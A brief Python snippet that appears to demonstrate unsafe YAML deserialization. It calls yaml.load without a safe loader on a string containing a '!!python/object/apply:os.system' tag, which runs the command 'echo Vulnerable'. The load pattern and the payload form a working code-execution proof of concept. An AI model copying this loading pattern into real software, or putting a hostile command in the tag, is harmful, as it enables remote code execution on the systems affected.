import yaml

def load_yaml(yaml_string):
    return yaml.load(yaml_string)

yaml_data = """
!!python/object/apply:os.system ['echo Vulnerable']
"""
data = load_yaml(yaml_data)
print(data)